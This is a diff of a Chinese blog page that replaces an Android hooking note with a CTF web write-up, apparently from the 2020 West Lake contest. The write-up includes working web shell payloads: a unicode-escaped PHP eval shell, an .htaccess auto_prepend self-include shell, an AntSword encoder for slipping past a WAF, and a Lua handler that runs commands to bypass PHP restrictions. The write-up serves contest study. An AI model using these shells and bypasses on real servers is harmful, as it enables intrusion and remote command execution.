@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    安卓之旅-2 |  
+    西湖丢脸大赛 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-安卓之旅-2"
+  id="post-西湖丢脸大赛"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,22 +67,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  安卓之旅-2
+  西湖丢脸大赛
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/" class="article-date">
-  <time datetime="2020-10-06T01:16:23.000Z" itemprop="datePublished">2020-10-06</time>
+      <a href="/2020/10/09/%E8%A5%BF%E6%B9%96%E4%B8%A2%E8%84%B8%E5%A4%A7%E8%B5%9B/" class="article-date">
+  <time datetime="2020-10-09T12:57:56.000Z" itemprop="datePublished">2020-10-09</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">176</span>
+            <span class="post-count">895</span>
         </span>
     </span>
 
@@ -91,7 +91,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -106,19 +106,35 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Android之旅2"><a href="#Android之旅2" class="headerlink" title="Android之旅2"></a>Android之旅2</h1><h2 id="一、动静态调试四大组件"><a href="#一、动静态调试四大组件" class="headerlink" title="一、动静态调试四大组件"></a>一、动静态调试四大组件</h2><p>(一)、activity </p>
-<p>一个又一个的界面，需要在<code>manifest</code>里面注册</p>
-<p>(二)、</p>
-<p>(三)、service</p>
-<p>(四)、broadcast receiver</p>
-<h2 id="二、开始分析"><a href="#二、开始分析" class="headerlink" title="二、开始分析"></a>二、开始分析</h2><p>1.先看<code>mainactivity</code></p>
-<p>2.receiver 注册广播，自动启动</p>
-<p>3.二进制数据解析软件editor</p>
-<h2 id="三、objection-初步体验"><a href="#三、objection-初步体验" class="headerlink" title="三、objection 初步体验"></a>三、objection 初步体验</h2><p><code>https://github.com/hluwa/Wallbreaker</code></p>
-<p>葫芦娃大佬的objection的插件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">objection -g + 包名 + explore</span><br><span class="line">android hooking watch class_method android.widget.Textview.setText --dump-args --dump-backtrace  --dump-return  hook 类的方法</span><br><span class="line">android hooking list activity  查看活动</span><br><span class="line">android hooking list class_methods + class name 查看类的方法</span><br><span class="line">android hooking list classes hook 类名 然后 cat .&#x2F;objection&#x2F;objection.log |grep -i 筛选该包的方法即可</span><br></pre></td></tr></table></figure>
+  <h2 id="西湖挑战杯WEB赛后总结"><a href="#西湖挑战杯WEB赛后总结" class="headerlink" title="西湖挑战杯WEB赛后总结"></a>西湖挑战杯WEB赛后总结</h2><h3 id="一、easyjson"><a href="#一、easyjson" class="headerlink" title="一、easyjson"></a>一、easyjson</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1621975/1602143338592-54ca3431-8858-49e9-8b7f-a964669ff4e0.png"></p>
+<p>这是题目一打开的模样，像极了爱情，我感觉我好像又可以了。</p>
+<p>wp1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xff设置ip 获取目录</span><br><span class="line">filename&#x3D;index.php可过check</span><br><span class="line">关键代码转unicode，然后进行getshell(具体见博客GETshell大法)</span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b?&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>jadx 的体验，我就不说了，要学点开发，才能做逆向</p>
+<p>这道题不亏是easyjson，但是这个还有一个解法2</p>
+<p>wp2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过unciode绕过写入htaccess的自包含木马php_value auto_prepend_fi\le .htaccess#&lt;?php eval($_POST[1])?&gt;# \ 然后注释下一行，然后getshell，readflag</span><br></pre></td></tr></table></figure>
+
+<p>这里既然提到了文件包含，就不得不深深地探究一波这个神秘的文件<code>.htaccess</code>详情看另外一篇文章</p>
+<h3 id="二、NewUpload"><a href="#二、NewUpload" class="headerlink" title="二、NewUpload"></a>二、NewUpload</h3><p>因为我在后续的复现过程中，并没有成功地getshell，所以我就简单利用一下大佬的原话对这里进行回复</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换行+一个图片文件头就可以shell，至于怎么蚁剑怎么连上去，自己随便写一个编码器(如下)，然后流量倒到burp，全局修改一下ua</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/1.png" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;10&#x2F;08 11:54:20</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; data[randomID];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用蚂蚁进行链接就可以成功地getshell。这里同时我们也可以扩展一下，在我们的实际运用中，也可以将一些编码的函数在php马儿中打出来，这样我们在实际使用这些马儿的时候，将传输的数据进行编码，然后在马儿中进行编码就可以简单地绕过waf</p>
+<p>最后这道题的实际思路如下:</p>
+<p>经过百度，宝塔的实际waf是用lua脚本写的，这一点在<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhuxiongyin/article/details/98174377%E8%BF%99%E4%B8%AA%E6%96%87%E7%AB%A0%E4%B8%AD%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%99%E4%B8%AAapache%E7%8E%AF%E5%A2%83%E5%BF%85%E5%AE%9A%E6%94%AF%E6%8C%81lua%E6%A8%A1%E5%9D%97%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%88%E7%AE%80%E5%8D%95%E5%9C%B0%E7%BB%95%E8%BF%87PHP%E7%9A%84disfunc%E7%9A%84%E9%99%90%E5%88%B6%E5%92%8C%E4%BB%A5%E5%8F%8Aopen_dir%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%80%E4%B8%AAlua%E8%84%9A%E6%9C%AC%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87">https://blog.csdn.net/zhuxiongyin/article/details/98174377这个文章中就可以知道，所以我们这个apache环境必定支持lua模块，这样我们就可以很简单地绕过PHP的disfunc的限制和以及open_dir的限制，简单的一个lua脚本即可绕过</a></p>
+<p>exp如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当然还有强大的wp2：攻击php-fpm</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d#">https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d?#</a></p>
+<p><a target="_blank" rel="noopener" href="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more">https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more</a></p>
+</blockquote>
  
       <!-- reward -->
       
@@ -181,12 +197,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/10/06/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-2/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/10/09/%E8%A5%BF%E6%B9%96%E4%B8%A2%E8%84%B8%E5%A4%A7%E8%B5%9B/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
 
     </footer>
   </div>
@@ -194,19 +210,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/10/09/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-3/" class="article-nav-link">
+      <a href="/2020/10/10/htaccess%E9%AA%9A%E6%93%8D%E4%BD%9C/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            安卓之旅-3
+            htaccess骚操作
           
         </div>
       </a>
     
     
-      <a href="/2020/10/05/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-1/" class="article-nav-link">
+      <a href="/2020/10/09/GetShell/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">安卓之旅-1</div>
+        <div class="article-nav-title">GetShell</div>
       </a>
     
   </nav>
